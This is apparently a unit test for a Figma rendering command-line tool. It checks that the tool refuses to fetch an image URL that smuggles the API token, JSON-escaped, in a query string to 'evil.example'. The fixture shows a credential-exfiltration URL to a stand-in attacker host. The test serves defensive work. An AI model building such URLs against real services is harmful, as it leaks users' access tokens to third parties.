import test from 'node:test';
import assert from 'node:assert/strict';
import {main} from '../index.ts';
import {png} from './fixtures/images.ts';
test('JSON-escaped image URL token is refused before any image-host request', async () => {
  const calls: string[] = [];
  let output = '';
  const exit = await main(['render', 'AbC123xyz456', '--node', '1-2', '--json'], {
    env: {FIGMA_TOKEN: 'figd_DUMMY_SECRET'}, write: value => { output += value; },
    fetch: async url => {
      calls.push(String(url));
      return String(url).startsWith('https://api.figma.com/')
        ? new Response('{"err":null,"images":{"1:2":"https://evil.example/i.png?t=\\u0066igd_DUMMY_SECRET"}}', {headers: {'content-type': 'application/json'}})
        : new Response(png, {status: 403});
    },
  });
  assert.equal(exit, 1);
  assert.deepEqual(JSON.parse(output), {error: 'Secret detected in output', code: 'security', help: ['Check the response content before retrying']});
  assert.deepEqual(calls, ['https://api.figma.com/v1/images/AbC123xyz456?ids=1%3A2&format=png&scale=1']);
});
